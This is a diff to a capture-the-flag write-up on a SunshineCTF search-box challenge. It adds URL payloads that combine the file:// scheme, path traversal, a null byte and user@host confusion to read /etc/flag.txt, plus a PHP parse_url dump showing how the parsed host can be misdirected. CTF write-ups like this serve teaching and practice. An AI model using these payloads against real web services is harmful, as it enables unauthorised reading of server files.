@@ -29,4 +29,21 @@ Let's open the URL and prod around. We find a search box, which can retrieve the
    http://search-box.web1.sunshinectf.org/?submit=Submit&site=file%3A%2F%2Fwww.google.com%2F..%2Fetc%2Fflag.txt%2500
    and this finally gets us the flag.
 8. file://user@127.0.0.1:80@www.google.com/etc/flag.txt
-9. file://user@127.0.0.1:80@www.google.com/etc/flag.txt#
+9. file://user@127.0.0.1:80@www.google.com/etc/flag.txt#‘
+
+```shell
+php > var_dump(parse_url("http://127.0.0.1:123.@c7f.zhuque.com/..//"));
+array(5) {
+  ["scheme"]=>
+  string(4) "http"
+  ["host"]=>
+  string(14) "c7f.zhuque.com"
+  ["user"]=>
+  string(9) "127.0.0.1"
+  ["pass"]=>
+  string(3) "123."
+  ["path"]=>
+  string(5) "/..//"
+}
+```
+
